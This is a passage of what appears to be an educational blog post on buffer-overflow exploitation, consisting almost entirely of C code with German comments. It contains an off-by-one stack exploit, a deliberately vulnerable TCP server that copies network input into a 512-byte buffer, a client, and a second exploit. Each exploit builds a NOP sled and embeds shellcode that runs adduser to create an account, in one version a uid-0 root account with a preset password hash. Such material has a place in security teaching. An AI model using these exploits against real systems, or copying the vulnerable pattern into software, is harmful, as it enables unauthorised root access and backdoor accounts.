+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/errno.h&gt;
+</span>
+<span class="cp">#define DEFAULT_OFFSET	500 - 32
+#define DEFAULT_BUFFER	521
+#define NOP		0x90
+</span>
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+	<span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+	<span class="c1">//Da zu viel Speicher reserviert wird</span>
+	<span class="c1">//(Bug von GCC). Schleife etwas weiter laufen</span>
+	<span class="c1">//lassen. Es wird trotzdem nur das Lower-Byte</span>
+	<span class="c1">//vom SFP �berschrieben!!!</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">520</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+	<span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">calctmp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">//Auruf erfolgt nicht �ber main,</span>
+	<span class="c1">//sondern �ber Zwischenfunktion, Warum???</span>
+	<span class="c1">//SFP wird bei main zu gro� und kann daher nicht</span>
+	<span class="c1">//erreicht werden.</span>
+	<span class="c1">//Pr�fen ob dies auch an argc und argv und envp liegt</span>
+	<span class="c1">//char arr[33];</span>
+	<span class="n">calc</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="c1">//char dummy[1];</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+	<span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>	<span class="c1">//Speicherplatz aufm Heap reserviren</span>
+
+	<span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
+	<span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//+1, da Stack falsch aufgebaut</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">buffs</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span>	<span class="c1">//Komplett mit der vermuteten Adresse f�llen</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>
+
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span> <span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">//erste H�lfte mit Nops f�llen</span>
+		<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>
+
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">));</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+
+	<span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//Off-by_one-Byte</span>
+
+	<span class="n">calctmp</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>
+
+	<span class="cm">/*printf("%s", buff);
+	fflush(stdout);*/</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="p">}</span></code></pre></figure>
+
+<h2 id="example-for-a-server-with-a-buffer-overflow-vulnerability">Example for a Server with a Buffer Overflow Vulnerability</h2>
+<h3 id="clientc">client.c</h3>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+
+<span class="cp">#define PORT 7777
+#define BUF_SIZE 1024
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"usage: client &lt;hostname&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="cm">/* create socket */</span>
+	<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"open stream socket"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+
+	<span class="cm">/* get internet address of host specified by command line */</span>
+	<span class="n">hp</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">hp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s unknown host.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="cm">/* copies the internet address to server address */</span>
+	<span class="n">bcopy</span><span class="p">(</span><span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
+
+	<span class="cm">/* set port */</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+	<span class="cm">/* open connection */</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"connecting stream socket"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="cm">/* read input from stdin */</span>
+	<span class="k">while</span><span class="p">(</span><span class="n">run</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">BUF_SIZE</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="n">run</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">perror</span><span class="p">(</span><span class="s">"error reading from stdin"</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+		
+		<span class="cm">/* write buffer to stream socket */</span>
+		<span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">run</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">perror</span><span class="p">(</span><span class="s">"writing on stream socket"</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<h3 id="serverc">server.c</h3>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="cp">#define LISTENQ 1024
+#define SA struct sockaddr
+#define PORT 7777
+</span>
+<span class="kt">void</span> <span class="nf">fc</span><span class="p">()</span> <span class="p">{</span>
+   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+	<span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">1024</span><span class="p">],</span> <span class="n">ed</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+	<span class="kt">int</span> <span class="n">listenfd</span><span class="p">,</span> <span class="n">connfd</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serveraddr</span><span class="p">;</span>
+	<span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">calc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+	<span class="n">listenfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>
+	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
+	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+	<span class="n">bind</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>
+
+	<span class="n">listen</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="n">LISTENQ</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="p">;)</span> <span class="p">{</span>
+
+		<span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+		<span class="k">do</span> <span class="p">{</span>
+			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Eingabe:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+			<span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+			<span class="n">text</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+			<span class="n">calc</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
+			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Gedreht:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">));</span>
+
+			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">%d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+			<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'!'</span><span class="p">);</span>
+
+		<span class="n">close</span><span class="p">(</span><span class="n">connfd</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<h3 id="exploitc">exploit.c</h3>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/errno.h&gt;
+</span>
+<span class="cp">#define DEFAULT_OFFSET	500
+#define DEFAULT_BUFFER	600
+#define NOP		0x90
+</span>
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+	<span class="s">"</span><span class="se">\xeb\x67\x5e\x89\x76\x4c\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x12\x89\x46\x50\x8d\x46\x15\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x54\x8d\x46\x17\x89\x46\x58</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x46\x1a\x89\x46\x5c\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x1d\x89\x46\x60\x8d\x46\x22\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x64\x8d\x46\x25\x89\x46\x68</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x46\x48\x89\x46\x6c\x31\xc0</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x11\x88\x46\x14\x88\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x16\x88\x46\x19\x88\x46\x1c\x88</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x21\x88\x46\x24\x88\x46\x47</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x4b\x89\x46\x70\xb0\x0b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x89\xf3\x8d\x4e\x4c\x8d\x56\x70</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x80\xe8\x94\xff\xff\xff\x2f\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x73\x72\x2f\x73\x62\x69\x6e\x2f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x61\x64\x64\x75\x73\x65\x72\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x75\x23\x30\x23\x2d\x6f\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x67\x23\x72\x6f\x6f\x74\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x70\x23\x24\x31\x24\x37\xcf</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x76\xd9\x4c\x4b\xcf\xb5\x24\x67</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x53\x55\x4b\x47\x36\x52\x41\x4c</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x7a\x52\x41\x38\x72\x79\x52\x4f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x63\x54\x73\x47\x30\x23\x72\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x74\x23</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+	<span class="n">i</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>	
+		<span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">)</span>
+		<span class="n">buffs</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	
+	<span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>	<span class="c1">//Speicherplatz aufm Heap reserviren</span>
+
+	<span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
+	<span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">tmp</span><span class="p">;</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">buffs</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span>	<span class="c1">//Komplett mit der vermuteten Adresse füllen</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>
+
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span> <span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">//erste Hälfte mit Nops füllen</span>
+		<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>
+	
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">));</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+	<span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+
+	<span class="cm">/*calc(buff);*/</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
+
+<span class="p">}</span></code></pre></figure>
+
+
+      <footer class="entry-meta">
+        <span class="entry-tags"></span>
+        
+        <span class="author vcard"><span class="fn">Markus Thill</span></span>
